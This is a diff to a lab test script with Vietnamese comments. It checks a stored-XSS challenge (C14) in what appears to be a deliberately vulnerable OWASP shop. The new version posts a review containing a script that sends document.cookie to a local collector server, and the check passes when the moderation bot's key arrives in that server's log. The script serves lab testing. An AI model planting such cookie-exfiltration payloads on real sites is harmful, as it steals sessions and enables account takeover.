@@ -75,18 +75,25 @@ else
   echo "FAIL  OBJ-verify (vi+en)"; FAIL=$((FAIL+1)); FAILED+=("OBJ-verify")
 fi
 
-# --- C14: stored XSS + moderation bot (chậm) ---
+# --- C14: stored XSS + bot exfil cookie về collector (chậm) ---
 if [[ "${WITH_BOT:-0}" == "1" ]]; then
-  echo "-- C14: trồng review payload, chờ bot ${BOT_WAIT}s --"
+  echo "-- C14: trồng payload exfil về collector local, chờ bot ${BOT_WAIT}s --"
+  LOG="$(mktemp)"
+  PORT="${C14_PORT:-18080}"
+  python3 -m http.server "$PORT" --bind 0.0.0.0 >/dev/null 2>"$LOG" &
+  SRV=$!
+  GW=$(docker network inspect owasp-shop-lab_lab_17_edge --format '{{(index .IPAM.Config 0).Gateway}}' 2>/dev/null || echo 172.18.0.1)
   curl -s -o /dev/null -X POST "$B/product/1/review" -H "Cookie: token=$ATOK" \
     --data-urlencode 'rating=5' \
-    --data-urlencode 'text=<script>fetch("/api/notes",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({text:"EXFIL:"+document.querySelector("code").textContent})})</script>'
+    --data-urlencode "text=<script>new Image().src=\"http://${GW}:${PORT}/c14?c=\"+encodeURIComponent(document.cookie)</script>"
   sleep "$BOT_WAIT"
-  if curl -s "$B/notes" | grep -q 'EXFIL:FLAG{c14}'; then
-    echo "PASS  C14-exfil"; PASS=$((PASS+1))
+  kill $SRV 2>/dev/null
+  if grep -q 'moderation_key' "$LOG"; then
+    echo "PASS  C14-exfil (bot gửi cookie chứa moderation_key về collector)"; PASS=$((PASS+1))
   else
-    echo "FAIL  C14-exfil (bot chưa exfil hoặc payload sai)"; FAIL=$((FAIL+1)); FAILED+=("C14-exfil")
+    echo "FAIL  C14-exfil (bot chưa exfil — kiểm tra bot có mạng edge & payload)"; FAIL=$((FAIL+1)); FAILED+=("C14-exfil")
   fi
+  rm -f "$LOG"
 fi
 
 echo "== Kết quả: $PASS PASS / $FAIL FAIL =="
